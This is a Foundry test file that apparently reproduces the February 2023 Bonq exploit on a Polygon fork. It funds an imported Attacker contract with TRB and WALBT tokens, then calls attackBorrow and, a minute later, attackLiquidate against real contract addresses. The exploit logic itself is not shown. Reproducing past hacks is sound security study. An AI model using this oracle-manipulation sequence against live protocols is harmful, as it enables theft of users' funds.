// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/bonq-february-2023/Attacker.sol";

contract BonqAttackerTest is Test {
    address constant TRB = 0xE3322702BEdaaEd36CdDAb233360B939775ae5f1;
    address constant WALBT = 0x35b2ECE5B1eD6a7a99b83508F8ceEAB8661E0632;
    address constant TELLOR_FLEX = 0x8f55D884CAD66B79e1a131f6bCB0e66f4fD84d5B;

    function setUp() public {
        vm.createSelectFork("polygon", 38792977);
    }

    function testAttack() public {
        Attacker attacker = new Attacker();

        deal(TRB, address(attacker), 2*ITellorFlex(TELLOR_FLEX).getStakeAmount());
        deal(WALBT, address(attacker), 15 ether);

        attacker.attackBorrow();
        vm.warp(block.timestamp + 1 minutes);
        attacker.attackLiquidate();
    }
}
